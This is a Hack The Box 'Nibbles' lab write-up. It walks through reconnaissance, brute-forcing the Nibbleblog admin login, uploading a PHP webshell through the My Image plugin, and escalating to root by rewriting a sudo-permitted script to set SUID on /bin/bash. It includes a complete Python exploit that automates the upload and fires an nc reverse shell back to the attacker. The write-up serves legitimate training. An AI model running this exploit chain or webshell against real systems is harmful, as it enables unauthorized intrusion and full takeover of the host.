---
title: 'HTB Nibbles - Easy'
date: 2024-05-10 00:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Linux, HTB]
---
**Nibbles** is an easy HTB machine where you need to abuse **weak credentials** in the web service to impersonate an administrative user. Subsequently, you can achieve RCE by uploading a **malicious PHP file** and gain root access to the machine by exploiting the **sudoers permissions** of the compromised user. I encourage you to build your own script to exploit this cool box.

<img src="/assets/img/nibbles/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.96.84

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.96.84 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.96.84 -sVC -p22,80

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 21:33 WEST
Nmap scan report for 10.129.96.84
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds

[+] Script finished successfully
```

This hello world receives us on port TCP/80.

<img src="/assets/img/nibbles/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Inspecting the source code reveals a ‘nibbleblog’ directory.

<img src="/assets/img/nibbles/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Now we can access this blog.

<img src="/assets/img/nibbles/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Enumerated the directories under /nibbleblog with FFUF.

```bash
ffuf -u "http://10.129.96.84/nibbleblog/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403
content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 60ms]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 1052ms]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 62ms]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 3057ms]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 4062ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 62ms]
```

Directory indexing is allowed in multiple endpoints but there isn’t much for us. Wappalyzer shows that we should look for PHP files.

<img src="/assets/img/nibbles/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

There are a few PHP files and they return 200 OK.

```bash
ffuf -u "http://10.129.96.84/nibbleblog/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403 -e .php
admin.php       [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 70ms]
index.php       [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 90ms]
install.php     [Status: 200, Size: 78, Words: 11, Lines: 1, Duration: 64ms]
feed.php        [Status: 200, Size: 302, Words: 8, Lines: 8, Duration: 119ms]
update.php      [Status: 200, Size: 1622, Words: 103, Lines: 88, Duration: 73ms]
sitemap.php     [Status: 200, Size: 402, Words: 33, Lines: 11, Duration: 70ms]
```

The admin.php file displays this login portal. Trying common credentials did not work.

<img src="/assets/img/nibbles/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

Used [cEWL](https://github.com/digininja/CeWL) to collect potential passwords and chose a small username wordlist from SecLists.

```bash
cewl http://10.129.96.84/nibbleblog/ -m 6 -d 4 --lowercase -w cewl.list

cp /usr/share/seclists/Usernames/top-usernames-shortlist.txt .
```

Performed a **cluster bomb attack with Intruder** and got a 302 status code.

<img src="/assets/img/nibbles/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

**Tip**: remove the arbitrary words that cEWL collected, so you won’t have to restart the machine or wait for accounts to unlock.

<img src="/assets/img/nibbles/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

We have successfully logged in as administrators.

<img src="/assets/img/nibbles/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

Apparently, we can upload images in ‘Plugins’ > ‘My image’.

<img src="/assets/img/nibbles/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

This will be our payload.

```php
<?php
        $cmd = system($_GET['fc8358bcf09e4b3947d1975622a9df14']);
        echo "<pre>" . $cmd . "</pre>";
?>
```

We got some warnings but nothing else.

<img src="/assets/img/nibbles/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

The image.php file has been uploaded.

<img src="/assets/img/nibbles/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">

And we achieved RCE as nibbler via webshell.

```
http://10.129.13.177/nibbleblog/content/private/plugins/my_image/image.php?fc8358bcf09e4b3947d1975622a9df14=whoami
```

<img src="/assets/img/nibbles/Untitled 12.png" alt="Untitled 12.png" style="width:800px;">

I created this Python script that automates the process of logging in, uploading a webshell and sending us a reverse shell. I'm kinda new to Python scripting so watching how this worked was a great feeling ngl.

```python
import argparse
import requests
import sys

def rev_shell(target, lhost, lport):
    try:
        command = f'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{lhost}%20{lport}%20%3E%2Ftmp%2Ff'
        url = f'http://{target}/nibbleblog/content/private/plugins/my_image/image.php?fc8358bcf09e4b3947d1975622a9df14={command}'

        requests.get(url, timeout=3)

    except requests.Timeout:
        print("\n[+] Check your Netcat listener! :)")

def login(target, user, password):
    url = f'http://{target}/nibbleblog/admin.php'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url = f'http://{target}/nibbleblog/admin.php'
    data = f'username={user}&password={password}'
    
    # create session
    s = requests.session()
    res = s.get(url)
    cookie = res.headers['set-cookie'].split(';')[0]
    print(f"\n[+] Cookie: {cookie}")

    # login
    response = s.post(url, headers=headers, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"\n[+] Successfully logged in as {user}")
        return s
    
    else:
        raise Exception("\n[!] Credentials are NOT valid! :(")

def exploit(target, s):
    url = f"http://{target}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"

    files = {
    'plugin': (None, 'my_image'),
    'title': (None, 'My image'),
    'position': (None, '4'),
    'caption': (None, ''),
    'image': ('webshell.php', '<?php\n$cmd = system($_GET[\'fc8358bcf09e4b3947d1975622a9df14\']);\necho "<pre>" . $cmd . "</pre>";\n?>', 'application/x-php'),
    'image_resize': (None, '1'),
    'image_width': (None, '230'),
    'image_height': (None, '200'),
    'image_option': (None, 'auto')
    }

    response = s.post(url, files=files)
    if response.status_code == 200:
        print("\n[+] Webshell uploaded at '/nibbleblog/content/private/plugins/my_image/image.php'")
        return True
    else:
        raise Exception("\n[!] Couldn't upload the webshell! :(")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Nibbles exploit"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    parser.add_argument('-u', '--user', dest='user', required=True)
    parser.add_argument('-p', '--password', dest='password', required=True)
    parser.add_argument('--lhost', dest='lhost', required=True)
    parser.add_argument('--lport', dest='lport', default=4444, type=int)

    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        session = login(args.target, args.user, args.password)
        exploit(args.target, session)
        rev_shell(args.target, args.lhost, args.lport)
        sys.exit(0)

    except Exception as e:
        print(e)

main()
```

We need to provide the credentials, the target host and our local address.

```bash
python3 nibbles.py -t 10.129.13.187 -u <REDACTED> -p <REDACTED> --lhost 10.10.14.112

[+] Cookie: PHPSESSID=li7bv1v4d5jemvb4hvqlt60427

[+] Successfully logged in as <REDACTED>

[+] Webshell uploaded at '/nibbleblog/content/private/plugins/my_image/image.php'

[+] Check your Netcat listener! :)
```

And there it is! A reverse shell has been established as Nibbler. Python4TheWin.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.13.187] 59234

$ whoami
nibbler

$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

<img src="/assets/img/nibbles/Untitled 13.png" alt="Untitled 13.png" style="width:800px;">

Transformed it into a pseudo interactive TTY and read the user flag.

```
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls /home
nibbler

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls /home/nibbler
personal.zip  user.txt

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat /home/nibbler/user.txt
24f0d22e3e80b38a****************
```

# PrivEsc

Listing Nibbler’s sudoers permissions reveals that we can run a monitor.sh script as root.

```
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Decompressed the ZIP file located in our home’s directory. The script is modifiable for us.

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh

nibbler@Nibbles:/home/nibbler$ ls -l personal/stuff/
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

Let’s create a simple backdoor.

```
nibbler@Nibbles:/home/nibbler$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/home/nibbler$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

And read the root flag. GGs!

```
nibbler@Nibbles:/home/nibbler$ /bin/bash -p

bash-4.3# whoami
root

bash-4.3# cat /root/root.txt
dc751712f6cd4675****************
```